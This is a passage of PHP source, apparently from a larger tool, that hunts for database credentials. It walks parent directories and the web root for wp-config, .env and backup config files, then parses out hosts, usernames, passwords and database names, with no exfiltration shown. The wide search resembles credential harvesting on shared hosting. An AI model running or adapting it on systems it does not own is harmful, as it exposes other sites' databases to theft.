function ba_dirs_to_search_config($base)
{
    $dirs = array();
    $rp = @realpath($base);
    if (!$rp) {
        if (is_dir($base)) {
            $dirs[] = $base;
        }
        return $dirs;
    }
    $dirs[] = $rp;
    $parent = @realpath($rp . '/..');
    if ($parent) {
        $dirs[] = $parent;
    }
    $parent2 = @realpath($rp . '/../..');
    if ($parent2) {
        $dirs[] = $parent2;
    }
    return array_values(array_unique($dirs));
}

function ba_scan_php_for_db_config($dir, $maxfiles)
{
    if (!is_dir($dir) || !is_readable($dir)) {
        return '';
    }
    $items = @scandir($dir);
    if (!$items) {
        return '';
    }
    $checked = 0;
    $i = 0;
    $n = count($items);
    for ($i = 0; $i < $n; $i++) {
        if ($checked >= $maxfiles) {
            break;
        }
        $item = $items[$i];
        if ($item === '.' || $item === '..') {
            continue;
        }
        if (!preg_match('/\.(php|inc|env|txt)$/i', $item)) {
            continue;
        }
        if (stripos($item, 'wp-config') === false && stripos($item, 'config') === false && $item !== '.env') {
            continue;
        }
        $full = $dir . '/' . $item;
        if (!is_file($full)) {
            continue;
        }
        $checked++;
        if (ba_is_wp_config($full)) {
            return ba_resolve_config_path($full);
        }
    }
    return '';
}

function ba_parse_env_file($file)
{
    if (!is_readable($file)) {
        return array('ok' => false);
    }
    $txt = file_get_contents($file);
    $db = array('host' => 'localhost', 'user' => '', 'pass' => '', 'name' => '');
    $prefix = 'wp_';
    if (preg_match('/^DB_HOST\s*=\s*([^\r\n#]+)/m', $txt, $m)) {
        $db['host'] = trim($m[1], " \t\"'");
    }
    if (preg_match('/^DB_USER\s*=\s*([^\r\n#]+)/m', $txt, $m)) {
        $db['user'] = trim($m[1], " \t\"'");
    }
    if (preg_match('/^DB_PASSWORD\s*=\s*([^\r\n#]*)/m', $txt, $m)) {
        $db['pass'] = trim($m[1], " \t\"'");
    }
    if (preg_match('/^DB_NAME\s*=\s*([^\r\n#]+)/m', $txt, $m)) {
        $db['name'] = trim($m[1], " \t\"'");
    }
    if (preg_match('/^TABLE_PREFIX\s*=\s*([^\r\n#]+)/m', $txt, $m)) {
        $prefix = trim($m[1], " \t\"'");
    }
    if ($db['user'] === '' || $db['name'] === '') {
        return array('ok' => false);
    }
    return array('ok' => true, 'db' => $db, 'prefix' => $prefix, 'config_file' => $file);
}

function ba_is_placeholder_cred($val)
{
    $v = strtolower(trim((string) $val));
    $bad = array(
        'username_here',
        'database_name_here',
        'password_here',
        'your_username',
        'your_password',
        'your_database',
        'example',
        'changeme',
        'xxxxxxxx',
    );
    $i = 0;
    $n = count($bad);
    for ($i = 0; $i < $n; $i++) {
        if ($v === $bad[$i] || strpos($v, $bad[$i]) !== false) {
            return true;
        }
    }
    return ($v === '');
}

function ba_is_unresolved_var($val)
{
    $val = trim((string) $val);
    return ($val !== '' && $val[0] === '$');
}

function ba_resolve_php_var($name, $txt)
{
    $name = ltrim((string) $name, '$');
    if ($name === '') {
        return '';
    }
    $patterns = array(
        '/\$' . preg_quote($name, '/') . '\s*=\s*[\'"]([^\'"]*)[\'"]\s*;/',
        '/\$' . preg_quote($name, '/') . '\s*=\s*[\'"]([^\'"]*)[\'"]/',
        '/\$' . preg_quote($name, '/') . '\s*=\s*([^;\s]+)/',
    );
    $i = 0;
    $pn = count($patterns);
    for ($i = 0; $i < $pn; $i++) {
        if (preg_match($patterns[$i], $txt, $m)) {
            $v = trim($m[1], " \t\n\r\0\x0B'\"");
            if ($v !== '' && !ba_is_unresolved_var($v)) {
                return $v;
            }
        }
    }
    return '';
}

function ba_var_alias($key)
{
    $map = array(
        'DB_HOST'     => array('dbhost', 'db_host'),
        'DB_USER'     => array('dbuser', 'db_user', 'username'),
        'DB_PASSWORD' => array('dbpass', 'db_pass', 'dbpassword', 'password'),
        'DB_NAME'     => array('dbname', 'db_name', 'database'),
    );
    return isset($map[$key]) ? $map[$key] : array();
}

function ba_resolve_cfg_value($key, $raw, $txt)
{
    $raw = trim((string) $raw, " \t\n\r\0\x0B'\"");
    if ($raw === '') {
        $aliases = ba_var_alias($key);
        $i = 0;
        $n = count($aliases);
        for ($i = 0; $i < $n; $i++) {
            $resolved = ba_resolve_php_var($aliases[$i], $txt);
            if ($resolved !== '') {
                return $resolved;
            }
        }
        return '';
    }
    if (ba_is_unresolved_var($raw)) {
        $resolved = ba_resolve_php_var($raw, $txt);
        if ($resolved !== '') {
            return $resolved;
        }
        $aliases = ba_var_alias($key);
        $i = 0;
        $n = count($aliases);
        for ($i = 0; $i < $n; $i++) {
            $resolved = ba_resolve_php_var($aliases[$i], $txt);
            if ($resolved !== '') {
                return $resolved;
            }
        }
        return '';
    }
    return $raw;
}

function ba_sanitize_db_host($host, $txt)
{
    $host = ba_resolve_cfg_value('DB_HOST', $host, $txt);
    if ($host === '' || ba_is_unresolved_var($host)) {
        $host = ba_resolve_php_var('dbhost', $txt);
    }
    if ($host === '' || ba_is_unresolved_var($host)) {
        $host = 'localhost';
    }
    if (!preg_match('/^[a-zA-Z0-9._\-:\/]+$/', $host)) {
        $host = 'localhost';
    }
    return $host;
}

function ba_parse_db_fields($txt)
{
    $db = array(
        'host' => ba_resolve_cfg_value('DB_HOST', ba_cfg_get('DB_HOST', $txt), $txt),
        'user' => ba_resolve_cfg_value('DB_USER', ba_cfg_get('DB_USER', $txt), $txt),
        'pass' => ba_resolve_cfg_value('DB_PASSWORD', ba_cfg_get('DB_PASSWORD', $txt), $txt),
        'name' => ba_resolve_cfg_value('DB_NAME', ba_cfg_get('DB_NAME', $txt), $txt),
    );
    if (preg_match('/^DB_HOST\s*=\s*([^\r\n#]+)/m', $txt, $m)) {
        $db['host'] = ba_resolve_cfg_value('DB_HOST', trim($m[1], " \t\"'"), $txt);
    }
    if (preg_match('/^DB_USER\s*=\s*([^\r\n#]+)/m', $txt, $m)) {
        $db['user'] = ba_resolve_cfg_value('DB_USER', trim($m[1], " \t\"'"), $txt);
    }
    if (preg_match('/^DB_PASSWORD\s*=\s*([^\r\n#]*)/m', $txt, $m)) {
        $db['pass'] = ba_resolve_cfg_value('DB_PASSWORD', trim($m[1], " \t\"'"), $txt);
    }
    if (preg_match('/^DB_NAME\s*=\s*([^\r\n#]+)/m', $txt, $m)) {
        $db['name'] = ba_resolve_cfg_value('DB_NAME', trim($m[1], " \t\"'"), $txt);
    }
    $db['host'] = ba_sanitize_db_host($db['host'], $txt);
    $prefix = 'wp_';
    if (preg_match('/\$table_prefix\s*=\s*[\'"]([^\'"]+)[\'"]/', $txt, $m)) {
        $prefix = $m[1];
    }
    if (preg_match('/^TABLE_PREFIX\s*=\s*([^\r\n#]+)/m', $txt, $m)) {
        $prefix = trim($m[1], " \t\"'");
    }
    return array('db' => $db, 'prefix' => $prefix);
}

function ba_extract_db_from_text($txt, $file)
{
    if ($txt === false || strlen($txt) < 15) {
        return null;
    }
    if (stripos($txt, '<html') !== false && stripos($txt, 'DB_NAME') === false && stripos($txt, '$dbname') === false) {
        return null;
    }
    if (stripos($txt, 'DB_NAME') === false && stripos($txt, '$dbname') === false && stripos($txt, '$db_name') === false) {
        return null;
    }
    $parsed = ba_parse_db_fields($txt);
    $db = $parsed['db'];
    $prefix = $parsed['prefix'];
    if ($db['user'] === '' || $db['name'] === '' || ba_is_unresolved_var($db['user']) || ba_is_unresolved_var($db['name'])) {
        return null;
    }
    if (ba_is_placeholder_cred($db['user']) || ba_is_placeholder_cred($db['name'])) {
        return null;
    }
    return array(
        'ok'     => true,
        'db'     => $db,
        'prefix' => $prefix,
        'file'   => $file,
    );
}

function ba_hunt_file_matches($name)
{
    if ($name === '.env') {
        return true;
    }
    if (stripos($name, 'wp-config') !== false) {
        return true;
    }
    if (preg_match('/config.*\.(php|inc|bak|old|save|orig|txt|env)$/i', $name)) {
        return true;
    }
    return false;
}

function ba_hunt_scan_dir($dir, $depth, $maxdepth, &$found, &$seen, $maxhits)
{
    if ($depth > $maxdepth || count($found) >= $maxhits || !is_dir($dir) || !is_readable($dir)) {
        return;
    }
    $items = @scandir($dir);
    if (!$items) {
        return;
    }
    $skip = array('node_modules', 'vendor', 'cache', 'uploads', 'upgrade', 'languages', 'fonts');
    $i = 0;
    $n = count($items);
    for ($i = 0; $i < $n; $i++) {
        if (count($found) >= $maxhits) {
            return;
        }
        $item = $items[$i];
        if ($item === '.' || $item === '..') {
            continue;
        }
        $full = $dir . '/' . $item;
        if (is_dir($full)) {
            if ($item[0] === '.' && $item !== '.env') {
                continue;
            }
            if (in_array(strtolower($item), $skip, true)) {
                continue;
            }
            ba_hunt_scan_dir($full, $depth + 1, $maxdepth, $found, $seen, $maxhits);
            continue;
        }
        if (!is_file($full) || !is_readable($full)) {
            continue;
        }
        if (!ba_hunt_file_matches($item)) {
            continue;
        }
        if (@filesize($full) > 512000) {
            continue;
        }
        $txt = @file_get_contents($full);
        $hit = ba_extract_db_from_text($txt, $full);
        if ($hit === null) {
            continue;
        }
        $key = $hit['db']['user'] . '@' . $hit['db']['host'] . '/' . $hit['db']['name'];
        if (isset($seen[$key])) {
            continue;
        }
        $seen[$key] = 1;
        $found[] = $hit;
    }
}

function ba_hunt_credentials($base)
{
    $found = array();
    $seen = array();
    $roots = array();
    if ($base !== '') {
        $roots = ba_dirs_to_search_config($base);
    }
    $here = @realpath(dirname(__FILE__));
    if ($here) {
        $roots[] = $here;
        $p = $here;
        $i = 0;
        for ($i = 0; $i < 8; $i++) {
            $parent = @realpath($p . '/..');
            if (!$parent || $parent === $p) {
                break;
            }
            $roots[] = $parent;
            $p = $parent;
        }
    }
    if (!empty($_SERVER['DOCUMENT_ROOT'])) {
        $dr = @realpath($_SERVER['DOCUMENT_ROOT']);
        if ($dr) {
            $roots[] = $dr;
            $roots[] = dirname($dr);
        }
    }
    $roots = array_values(array_unique(array_filter($roots)));
    $i = 0;
    $rn = count($roots);
    for ($i = 0; $i < $rn; $i++) {
        ba_hunt_scan_dir($roots[$i], 0, 5, $found, $seen, 12);
    }
    return $found;
}

function ba_mask_pass($pass)
{
    $len = strlen($pass);
    if ($len <= 2) {
        return str_repeat('*', $len);
    }
    return substr($pass, 0, 1) . str_repeat('*', max(1, $len - 2)) . substr($pass, -1);
}

